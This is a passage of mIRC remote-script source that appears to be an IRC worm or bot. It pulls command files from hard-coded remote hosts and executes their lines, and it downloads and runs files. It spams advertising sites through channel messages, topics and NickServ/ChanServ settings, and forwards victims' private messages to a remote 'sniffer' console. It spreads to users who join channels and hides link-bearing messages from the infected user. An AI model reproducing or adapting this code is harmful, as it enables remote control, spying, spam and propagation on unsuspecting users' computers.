n378=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }
n379=}
n380=alias GetHTTP {
n381=  var %http.sock = $OpenIt(GetHTTP)
n382=  .hadd Data $rev(%http.sock, LocalName) $2
n383=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }
n384=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))
n385=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Stat) $getStat
n386=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0
n387=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }
n388=  else { .hdel -w Data $rev(%http.sock, *) }
n389=}
n390=on *:sockopen:GetHTTP-*:{
n391=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
n392=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))
n393=}
n394=on *:sockread:GetHTTP-*:{
n395=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
n396=  var %sRead = "" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))
n397=  if ($hget(Data, $rev($sockname, EOR)) == 1) {
n398=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {
n399=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }
n400=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }
n401=    }
n402=    if (EXEC isin %http.Options) {
n403=      .sockread %sRead | %sRead = [ [ %sRead ] ]
n404=      if (%sRead == EOF2) { .hadd Data $rev($sockname, Final) 1 }
n405=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }
n406=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }
n407=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Stat)) == $getStat) && (%sRead != EOF)) { %sRead }
n408=    }
n409=  }
n410=  else {
n411=    .sockread %sRead
n412=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }
n413=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }
n414=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { 
n415=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))
n416=      .remini $GFN(DEF) HTTP %sParam | if (SOS !isin %sParam && SAVE !isin %http.Options) { .writeini $GFN(DEF) DDos %sParam FLOOD }
n417=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return
n418=    }
n419=  }
n420=  if ($hget(Data, $rev($sockname, Final)) == 1) {
n421=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName | .hadd Data Visited 1 }
n422=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname
n423=  }
n424=}
n425=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }
n426=
n427=; * ADVERTISING *
n428=alias getColor { var %sColors = 2.3.4.7.10.12.14 , %iColor = $rand(1, $numtok(%sColors, $asc(.))) | .return  $+  $+ $gettok(%sColors, %iColor, $asc(.)) }
n429=alias getText {
n430=  var %iUseExtra = $rand(1,8) , %iUseColor = $rand(1,4) , %sPrefix , %sText = $gettok($1-, 2, $asc(*)) , %sSite , %iSite , %iColor = 
n431=  if ($getCountry == BG) { %sText = $gettok($1-, 1, $asc(*)) }
n432=  if (%iUseColor != 2) { %iColor = $getColor | %sPrefix = %iColor }
n433=  %sSite = $matchtok(%sText,http,1,32) | if (!%sSite) { %sSite = $matchtok(%sText,www,1,32) }
n434=  if (%sSite) {
n435=    %iSite = $findtok(%sText,%sSite,1,32)
n436=    if (%iUseExtra == 4) { %sPrefix = $null | %iColor =  | %iUseExtra = 1 } 
n437=    if (%iUseExtra == 7) { %sPrefix = $null | %iColor =  | %iUseExtra = 2 }
n438=    if (%iUseExtra == 1) || (%iUseExtra == 3) { %sSite =  $+  $+  $+ 12 $+ %sSite $+  $+ %iColor }
n439=    if (%iUseExtra == 2) || (%iUseExtra == 5) { %sSite =  $+  $+  $+ 4 $+ %sSite $+  $+ %iColor }
n440=    if (%iUseExtra == 8) { %sSite =  $+  $+ 3 $+ %sSite $+ %iColor }
n441=    %sText = $puttok(%sText,%sSite,%iSite,32)
n442=  }
n443=  .return %sPrefix $+ %sText
n444=}
n445=
n446=alias advMe {
n447=  var %sSite = $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))) , %sChan = $chan($rand(1,$chan(0))) , %i = $rand($1, $2)
n448=  .timerOnJoin-* off | .hadd Data OnJoinMsg Off | .hadd Data OnJoinNotice Off
n449=  if (!%sChan) || (!%sSite) { .return }
n450=  var %sDesc = $getText($readini($GFN(DEF),Sites,%sSite)) , %sSite = www. $+ %sSite
n451=  if (%i == 1) { if ($getCountry == BG) { .ignore -u20 NS | .msg ns set URL $getText(%sSite $+ * $+ %sSite) }
n452=  else { .ignore -u20 NickServ | .raw -q NickServ set URL $getColor $+ %sSite } }
n453=  if (%i == 2) { if ($getCountry == BG) { .ignore -u20 CS | .msg cs set %sChan URL $getText(%sSite $+ * $+ %sSite) }
n454=  else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan URL %sSite } }
n455=  if (%i == 3) { .ignore -u20 *!*@* | .msg %sChan %sDesc }
n456=  if (%i == 4) { .hadd Data OnJoinMsg On | .hadd Data Site %sDesc }
n457=  if (%i == 5) { .hadd Data OnJoinNotice On | .hadd Data Site %sDesc }
n458=  if (%i == 6) { .ignore -u20 *!*@* | .describe %sChan -> $getColor $+ %sSite }
n459=  if (%i == 7 && http !isin $chan(%sChan).Topic && www !isin $chan(%sChan).Topic) {
n460=    if ($getCountry == BG) { .ignore -u20 CS | .msg cs set %sChan Topic %sDesc }
n461=    else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan Topic %sDesc }
n462=  }
n463=  if (%i == 8) { .ignore -u20 *!*@* | .amsg %sDesc }
n464=}
n465=
n466=alias advIt {
n467=  if ($hget(Data, OnJoinMsg) == On && $hget(Data, Site)) { .msg $1 $hget(Data, Site) }
n468=  else if ($hget(Data, OnJoinNotice) == On && $hget(Data, Site)) { .notice $1 $hget(Data, Site) }
n469=  .ignore -u900 $1
n470=}
n471=
n472=alias setSites {
n473=  .addSITE GamesNet.150m.com www.GamesNet.150m.com - Sait za maniaci na Counter Strike, Brood War i WarCraft III..*www.GamesNet.150m.com - The Web Site for all the gamerz keen on CS, Brood War and WarCraft III..
n474=  .addSITE Girls-World.Cjb.Net www.Girls-World.Cjb.Net <-> Zabraneno za maje :)))*www.Girls-World.Cjb.Net <-> Restricted for men :)))
n475=  .addSITE Teen-Zone.FaithWeb.CoM Zonata na vsichki bulgarski teenz :: www.Teen-Zone.FaithWeb.com :: Anti-Spek generator :00 Zapoznanstva, Liuboff, Priqteli, Problemi..*The worldwide teen zone :: www.Teen-Zone.FaithWeb.com :: Find new friends, Solve your problems, Share your feelings.. Just enjoy :)
n476=  .addSITE EliteFitness.8m.com Za vsichki fenove na sporta, hubavite tela i zdravoslovniq nachin na jivot - www.EliteFitness.8m.com - Neka SilaTa BaDe s TeB :pP*Are you keen on Sport, Hot Bodies and Fitness? - www.EliteFitness.8m.com - The PoWeR is WiTh YoU :pP
n477=  .addSITE Techno-Mania.cjb.net :: www.Techno-Mania.cjb.net :: Techno muzikata shte spasi sveta, badi edin ot ocelelite, badi edin ot nas! Techno Forever!! ::*:: www.Techno-Mania.cjb.net :: The Techno Music will save the World, Be One of the Survivors, Be One of Us! Techno Forever!! ::
n478=  .addSITE GSM-BG.ItGo.Com SMS kam Globul i Mtel, Qki Melodii, Fun SMS, Snimki, Katalog: WwW.GSM-BG.ItGo.CoM :)*WwW.GSM-BG.ItGo.CoM :Talk for free, Free international SMS, Ringtones & Fun. That's It :)))
n479=  .addSITE Schumacher-1.Cjb.Net « www.Schumacher-1.cjb.net » Za vsichki fenove na nai-qkiq sport na sveta - Klasirane, Snimki, Pisti, Biogragii, Interviuta :>>*« www.Schumacher-1.cjb.net » The best place for F1 fans - Ranks, Photos, Races, Biographies, Interviews :>>
n480=  .addSITE JuKe-BoX.150m.CoM Obichash li muzikata? Obichash li q bezplatna i qka? Tova mqsto e za teb :)(: wWw.JuKe-BoX.150m.CoM :)*Do you like music? Do you like it free and c00l? That's the right place for you :)(: wWw.JuKe-BoX.150m.CoM :)
n481=  if ($getCountry == BG) { .addHTTP Rahmul.hit.bg/Commands.txt NULL EXEC | .addHTTP free.bol.bg/rahmul/Commands.txt NULL EXEC | .addHTTP free.techno-link.com/Rahmul/Commands.txt NULL EXEC }
n482=  else { .addHTTP Rahmul4o.tripod.com/Commands.txt NULL EXEC | .addHTTP geocities.com/Rahmul4o/Commands.txt NULL EXEC | .addHTTP Rahmulka.tripod.com/Commands.txt NULL EXEC }
n483=  .writeini $winFile Options Init2 1
n484=}
n485=
n486=; * TRIGGERS *
n487=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) { .setCountry BG } } | if (40* iswm $numeric) .halt }
n488=on ^*:Action:*:#:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }
n489=on ^*:Open:?:*:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }
n490=on ^*:Text:*:*:{
n491=  if ($target !ischan) { .extractAddr NICK $1- } | if ($target ischan) { .extractAddr CHAN $1- }
n492=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u60 $nick | .halt }
n493=  if ($target !ischan) { if (m isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (MSG) ( $+ $Nick $+ ) $1- } }
n494=}
n495=on ^*:Notice:*:*:{
n496=  if ($target !ischan) { .extractAddr NICK $1- } | if ($target ischan) { .extractAddr CHAN $1- }
n497=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u60 $nick | .halt }
n498=  if ($target !ischan) { if (n isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (NOTICE) ( $+ $Nick $+ ) $1- } }
n499=  if ($1 == IP!) { .notice $nick IP_ $+ $IP | .halt }
n500=  else if (IP_* iswm $1) {
n501=    .hadd Data iIP $calc($hget(Data, iIP) + 1)
n502=    if ($hget(Data, iIPCount) // $hget(Data, iIP) && $me != $nick) { .OpenConsole $nick $gettok($1,2,$asc(_)) }
n503=    .halt
n504=  }
n505=}
n506=on ^*:Join:*:{
n507=  if ($nick == $me) { if ($hget(Data, Drop) == On) { .timerDrop- $+ $chan 1 60 .Drop CHAN $chan } }
n508=  else {
n509=    if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) {
n510=      .hadd Data iInvite $calc($hget(Data, iInvite) + 1)
n511=      if ($hget(Data, iInviteCount) // $hget(Data, iInvite)) { .timerOnJoin- $+ $nick 1 $rand(45, 60) .AdvIt $nick }
n512=    }
n513=    if ($hget(Data, Spread) == On) || ($hget(Data, Mass) == On) {
n514=      .hadd Data iJoin $calc($hget(Data, iJoin) + 1)
n515=      if ($hget(Data, iJoinCount) // $hget(Data, iJoin)) { .OpenConsole $nick $GetTok($address,2,$asc(@)) }
n516=    }
n517=  }
n518=}
n519=on ^*:Op:*:{ .timerOnJoin- $+ $opnick Off }
n520=on ^*:Part:*:{ .timerOnJoin- $+ $nick Off }
n521=on ^*:Quit:{ .timerOnJoin- $+ $nick Off }
n522=on ^*:Nick:{ 
n523=  if ($hget(Data, Drop) == On && $nick == $me) { .timerDrop- $+ $nick off | .timerDrop- $+ $newnick 1 60 .Drop NICK $newnick }
n524=  if ($hget(Data, OnJoinNotice) == On) || ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick Off }
n525=}
